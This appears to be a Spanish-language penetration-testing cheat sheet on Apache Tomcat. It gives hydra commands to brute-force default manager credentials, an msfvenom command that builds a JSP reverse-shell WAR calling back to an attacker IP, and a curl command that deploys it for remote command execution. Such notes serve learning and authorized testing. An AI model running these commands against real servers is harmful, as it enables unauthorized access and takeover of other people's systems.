---
description: Gestor de servlets
---

# Tomcat

Normalmente en el puerto 8080

## Credenciales por defecto

Generalmente nos encontramos en /manager/html una autenticación básica por HTTP que puede ser vulnerable a credenciales por defecto.

Existen en metasploit algunos diccionarios concretos para usuarios y contraseñas por defecto para Tomcat que podemos encontrar en Kali y Parrot en /usr/share/wordlists/metasploit/tomcat...

Podemos utilizar hydra para probarlas.

```
hydra -L /usr/share/wordlists/metasploit/tomcat_mgr_default_users.txt -P /usr/share/wordlists/metasploit/tomcat_mgr_default_pass.txt -s <puerto> <ipobjetivo> http-get /manager/html
```

## Ejecución de comandos

Si conseguimos acceso a /manager/html con credenciales válidas podemos subir un archivo .war que será interpretado y nos permitirá obtener ejecución remota de comandos en el servidor.

Podemos crear una shell maliciosa en un archivo .war utilizando la utilidad msfvenom.

```
msfvenom -p java/jsp_shell_reverse_tcp LHOST=<ipatacante> LPORT=<puerto> -f war > shell.war
```

Para subirlo podemos hacerlo manualmente a través del navegador o podemos utilizar la utilidad curl en la línea de comandos.

```
curl --upload-file shell.war -u 'usuario:contraseña' "http://<hostIP>:<puerto>/manager/text/deploy?path=/shell"
```





> \*Disclaimer: Este manual está realizado en base a lo que voy aprendiendo, si parte de la información que comparto no es correcta estaré encantado de que te pongas en contacto conmigo para hacérmelo saber y poder modificarlo.
